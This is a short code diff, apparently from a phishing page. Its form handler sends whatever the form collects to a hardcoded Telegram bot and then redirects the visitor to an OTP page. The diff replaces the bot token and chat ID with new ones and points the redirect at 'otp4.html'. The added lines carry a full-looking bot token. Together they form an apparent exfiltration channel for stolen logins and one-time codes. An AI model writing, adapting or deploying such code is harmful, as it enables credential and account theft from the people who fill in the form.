@@ -13,8 +13,8 @@
          });
        });
 
-       const chat_id = '6743472561',
-         botID = 'bot7714679923%3AAAEkJ0Akl-OzdOOFzEP5UoIehrW5dwVSnMA';
+       const chat_id = '7013777869',
+         botID = 'bot7206118968:AAF7dqMS0TP3vWRDyXsYqbzaiNu7iHUyjDU';
 
        const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
@@ -34,7 +34,7 @@
          else
            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
          e.target.reset(); // Clear the form fields.
-         window.location.href = 'otp.html';
+         window.location.href = 'otp4.html';
        });
 
 
